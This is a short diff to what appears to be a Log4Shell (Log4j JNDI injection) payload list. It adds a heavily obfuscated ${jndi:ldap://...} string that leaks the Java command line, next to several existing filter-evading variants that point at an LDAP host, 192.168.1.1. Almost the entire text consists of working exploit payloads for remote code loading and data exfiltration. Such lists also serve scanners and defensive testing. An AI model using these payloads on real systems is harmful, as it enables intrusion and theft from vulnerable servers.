@@ -10,6 +10,9 @@ ${jndi:${lower:l}${lower:d}ap://192.168.1.1:389/evil}
 #a more complex one
 ${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//192.168.1.1:389/exploit}
 
+#an even more complex one
+${${djsKSAI:JSKka:-j}n${OiwdjIA:EdjkaAS:AS:-d}i${orjJWR:ASKDJjd:-:}${IQjdsj:jdAKS:-l}d${jieUEL:KHeyD:-a}p${wiIWcij:NbvduE:-:}//192.168.1.1/{{BaseURL}}/${sys:sun.java.command}}
+
 #another example
 ${${::-j}nd${::-i}:ldap://192.168.1.1:389/a}
 
